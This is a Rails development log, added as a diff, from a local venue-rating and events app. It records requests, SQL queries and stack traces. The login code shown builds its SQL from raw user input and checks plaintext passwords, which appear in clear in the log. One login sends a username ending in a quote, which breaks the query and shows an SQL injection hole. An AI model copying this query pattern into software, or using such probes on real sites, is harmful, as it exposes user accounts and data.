+Rendered ratings/_show (1.1ms)
+Completed in 22ms (View: 2, DB: 7) | 200 OK [http://localhost/ratings/rate/1?score=1]
+
+
+Processing RatingsController#index (for 127.0.0.1 at 2010-11-26 16:43:11) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.4ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (0.7ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+
+
+ActionController::UnknownAction (No action responded to index. Actions: check_authentication and rate):
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/filters.rb:617:in `call_filters'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/filters.rb:610:in `perform_action_without_benchmark'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/benchmarking.rb:68:in `perform_action_without_rescue'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/1.8/benchmark.rb:293:in `measure'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/benchmarking.rb:68:in `perform_action_without_rescue'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/rescue.rb:136:in `perform_action_without_caching'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/caching/sql_cache.rb:13:in `perform_action'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/connection_adapters/abstract/query_cache.rb:34:in `cache'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/query_cache.rb:8:in `cache'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/caching/sql_cache.rb:12:in `perform_action'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:524:in `send'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:524:in `process_without_filters'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/filters.rb:606:in `process_without_session_management_support'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/session_management.rb:134:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:392:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:183:in `handle_request'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:110:in `dispatch_unlocked'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:123:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:122:in `synchronize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:122:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:132:in `dispatch_cgi'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:39:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/rails.rb:76:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/rails.rb:74:in `synchronize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/rails.rb:74:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:159:in `process_client'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:158:in `each'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:158:in `process_client'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `initialize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `new'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `initialize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `new'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:282:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:281:in `each'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:281:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/command.rb:212:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load_without_new_constant_marking'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:521:in `new_constants_in'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/rails-2.2.2/lib/commands/servers/mongrel.rb:64
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `gem_original_require'
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:153:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:521:in `new_constants_in'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:153:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/rails-2.2.2/lib/commands/server.rb:49
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `gem_original_require'
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `require'
+    script/server:3
+
+Rendering /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/templates/rescues/layout.erb (not_found)
+
+
+Processing VenuesController#show (for 127.0.0.1 at 2010-11-26 16:43:23) [GET]
+  Parameters: {"id"=>"1"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.1ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (0.4ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;36;1mVenue Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+  [4;35;1mVenue Load (0.4ms)[0m   [0mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+Rendering template within layouts/application
+Rendering venues/show
+DEPRECATION WARNING: Calling render with a string will render a partial from Rails 2.3. Change this call to render(:file => 'tags/cloud', :locals => locals_hash).. (called from render at /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/base.rb:243)
+  [4;36;1mJoin Table Columns (1.0ms)[0m   [0;1mSHOW FIELDS FROM `tags_venues`[0m
+  [4;35;1mTag Load (0.5ms)[0m   [0mSELECT * FROM `tags` INNER JOIN `tags_venues` ON `tags`.id = `tags_venues`.tag_id WHERE (`tags_venues`.venue_id = 1 ) [0m
+  [4;36;1mTag Columns (0.9ms)[0m   [0;1mSHOW FIELDS FROM `tags`[0m
+Rendered tags/_show (2.4ms)
+Rendered tags/_new (0.7ms)
+  [4;35;1mRating Load (0.2ms)[0m   [0mSELECT * FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+  [4;36;1mRating Columns (1.0ms)[0m   [0;1mSHOW FIELDS FROM `ratings`[0m
+  [4;35;1mSQL (0.2ms)[0m   [0mSELECT avg(`ratings`.score) AS avg_score FROM `ratings` WHERE (venue_id = 1) [0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSELECT count(*) AS count_all FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+Rendered ratings/_show (1.1ms)
+  [4;35;1mComment Load (0.2ms)[0m   [0mSELECT * FROM `comments` WHERE (`comments`.commentable_id = 1 AND `comments`.commentable_type = 'Venue') [0m
+  [4;36;1mComment Columns (1.0ms)[0m   [0;1mSHOW FIELDS FROM `comments`[0m
+  [4;35;1mRole Columns (0.9ms)[0m   [0mSHOW FIELDS FROM `roles`[0m
+  [4;36;1mRole Load (0.4ms)[0m   [0;1mSELECT * FROM `roles` WHERE (`roles`.`id` = 2) [0m
+Rendered comments/_comment (6.3ms)
+Rendered comments/_comment (0.5ms)
+Rendered comments/_new (1.0ms)
+Completed in 50ms (View: 37, DB: 3) | 200 OK [http://localhost/venues/show/1]
+
+
+Processing SessionController#logout (for 127.0.0.1 at 2010-11-26 16:43:27) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/logout
+Completed in 5ms (View: 3, DB: 0) | 200 OK [http://localhost/logout]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-11-26 16:43:30) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 5ms (View: 3, DB: 0) | 200 OK [http://localhost/login]
+
+
+Processing SessionController#check_login (for 127.0.0.1 at 2010-11-26 16:43:35) [POST]
+  Parameters: {"commit"=>"Login", "authenticity_token"=>"83421c613c78f3406023fcf304d6605c20dfa540", "user"=>{"username"=>"bob", "password"=>"hello"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Load (0.3ms)[0m   [0mSELECT * FROM `users` WHERE (username = 'bob' AND password = 'hello') LIMIT 1[0m
+  [4;36;1mUser Columns (1.5ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Redirected to /users/1
+Completed in 8ms (DB: 2) | 302 Found [http://localhost/session/check_login]
+
+
+Processing UsersController#show (for 127.0.0.1 at 2010-11-26 16:43:36) [GET]
+  Parameters: {"id"=>"1"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.5ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (0.3ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 1) [0m
+found user
+  [4;35;1mCACHE (0.0ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 1) [0m
+Rendering template within layouts/application
+Rendering users/show
+  [4;36;1mComment Columns (1.7ms)[0m   [0;1mSHOW FIELDS FROM `comments`[0m
+  [4;35;1mSQL (0.3ms)[0m   [0mSELECT count(*) AS count_all FROM `comments` WHERE (`comments`.commentable_id = 1 AND `comments`.commentable_type = 'User') [0m
+  [4;36;1mEvent Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `events`[0m
+  [4;35;1mSQL (0.5ms)[0m   [0mSELECT count(*) AS count_all FROM `events` WHERE (`events`.user_id = 1) [0m
+Completed in 24ms (View: 17, DB: 2) | 200 OK [http://localhost/users/1]
+
+
+Processing EventsController#show (for 127.0.0.1 at 2010-11-26 16:44:19) [GET]
+  Parameters: {"id"=>"1"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.8ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (1.0ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 1) [0m
+found user
+  [4;36;1mEvent Columns (1.1ms)[0m   [0;1mSHOW FIELDS FROM `events`[0m
+  [4;35;1mEvent Load (1.3ms)[0m   [0mSELECT * FROM `events` WHERE (`events`.`id` = 1) [0m
+Rendering template within layouts/application
+Rendering events/show
+  [4;36;1mUser Load (0.6ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 3) [0m
+  [4;35;1mAttendee Columns (2.8ms)[0m   [0mSHOW FIELDS FROM `attendees`[0m
+Rendered attendees/_new (9.6ms)
+  [4;36;1mAttendee Load (0.5ms)[0m   [0;1mSELECT * FROM `attendees` WHERE (`attendees`.event_id = 1) [0m
+Rendered attendees/_attendee (0.9ms)
+Rendered attendees/_attendee (0.5ms)
+Completed in 38ms (View: 23, DB: 5) | 200 OK [http://localhost/events/1]
+
+
+Processing SessionController#logout (for 127.0.0.1 at 2010-11-26 16:47:29) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/logout
+Completed in 5ms (View: 3, DB: 0) | 200 OK [http://localhost/logout]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-11-26 16:47:31) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 6ms (View: 3, DB: 0) | 200 OK [http://localhost/login]
+
+
+Processing SessionController#check_login (for 127.0.0.1 at 2010-11-26 16:47:40) [POST]
+  Parameters: {"commit"=>"Login", "authenticity_token"=>"dbf1721020854b33862ecb00e19544ccc0501787", "user"=>{"username"=>"hello'", "password"=>"foo"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Load (0.0ms)[0m   [0mMysql::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'foo') LIMIT 1' at line 1: SELECT * FROM `users` WHERE (username = 'hello'' AND password = 'foo') LIMIT 1[0m
+
+
+ActiveRecord::StatementInvalid (Mysql::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'foo')  LIMIT 1' at line 1: SELECT * FROM `users` WHERE (username = 'hello'' AND password = 'foo')  LIMIT 1):
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/connection_adapters/abstract_adapter.rb:188:in `log'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/connection_adapters/mysql_adapter.rb:309:in `execute'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/connection_adapters/mysql_adapter.rb:563:in `select'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/connection_adapters/abstract/database_statements.rb:7:in `select_all_without_query_cache'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/connection_adapters/abstract/query_cache.rb:60:in `select_all'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/connection_adapters/abstract/query_cache.rb:81:in `cache_sql'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/connection_adapters/abstract/query_cache.rb:60:in `select_all'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/base.rb:635:in `find_by_sql'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/base.rb:1490:in `find_every'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/base.rb:1452:in `find_initial'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/base.rb:587:in `find'
+    /app/controllers/session_controller.rb:19:in `check_login'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:1253:in `send'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:1253:in `perform_action_without_filters'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/filters.rb:617:in `call_filters'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/filters.rb:610:in `perform_action_without_benchmark'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/benchmarking.rb:68:in `perform_action_without_rescue'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/1.8/benchmark.rb:293:in `measure'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/benchmarking.rb:68:in `perform_action_without_rescue'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/rescue.rb:136:in `perform_action_without_caching'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/caching/sql_cache.rb:13:in `perform_action'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/connection_adapters/abstract/query_cache.rb:34:in `cache'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/query_cache.rb:8:in `cache'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/caching/sql_cache.rb:12:in `perform_action'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:524:in `send'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:524:in `process_without_filters'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/filters.rb:606:in `process_without_session_management_support'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/session_management.rb:134:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:392:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:183:in `handle_request'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:110:in `dispatch_unlocked'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:123:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:122:in `synchronize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:122:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:132:in `dispatch_cgi'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:39:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/rails.rb:76:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/rails.rb:74:in `synchronize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/rails.rb:74:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:159:in `process_client'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:158:in `each'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:158:in `process_client'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `initialize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `new'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `initialize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `new'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:282:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:281:in `each'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:281:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/command.rb:212:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load_without_new_constant_marking'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:521:in `new_constants_in'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/rails-2.2.2/lib/commands/servers/mongrel.rb:64
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `gem_original_require'
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:153:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:521:in `new_constants_in'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:153:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/rails-2.2.2/lib/commands/server.rb:49
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `gem_original_require'
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `require'
+    script/server:3
+
+Rendered /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/templates/rescues/_trace (42.3ms)
+Rendered /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/templates/rescues/_request_and_response (0.7ms)
